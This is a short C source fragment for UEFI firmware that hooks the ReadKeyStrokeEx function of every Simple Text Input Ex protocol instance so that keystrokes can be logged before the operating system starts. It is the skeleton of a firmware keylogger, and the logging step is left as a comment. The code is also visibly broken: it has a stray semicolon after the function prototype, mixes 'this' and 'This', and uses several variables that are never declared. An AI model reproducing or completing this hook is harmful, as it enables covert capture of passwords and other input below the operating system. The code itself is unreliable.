#include <Uefi.h>
#include <Protocol/SimpleTextInEx.h>

EFI_STATUS EFIAPI ReadKeyStrokeExHook(IN EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *This,
                                      OUT EFI_KEY_DATA *KeyData);
{
    SimpleTextInputExHook *Hook = GetHookFromProtocol(this);
    Hook->ReadKeyStrokeExOriginal(This, KeyData);

    // log keystrokes
}

VOID HookSimpleTextInEx()
{
    gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleTextInputExProtocolGuid,
                            NULL, &HandleCount, Handles);

    gHooks = AllocatePool(HandleCount * sizeof(SimpleTextInputExHook));

    for (UINTN i = 0; i < HandleCount; ++i)
    {
        EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *SimpleTextInEx;
        status = gBS->HandleProtocol(Handles[i],
                                     &gEfiSimpleTextInputExProtocolGuid,
                                     (VOID **)&SimpleTextInEx);

        SimpleTextInputExHook *Hook = &gHooks[gHookCount++];
        Hook->SimpleTextInEx = SimpleTextInEx;
        Hook->ReadKeyStrokeExOriginal = SimpleTextInEx->ReadKeyStrokeEx;

        SimpleTextInEx->ReadKeyStrokeEx = ReadKeyStrokeExHook;
    }
}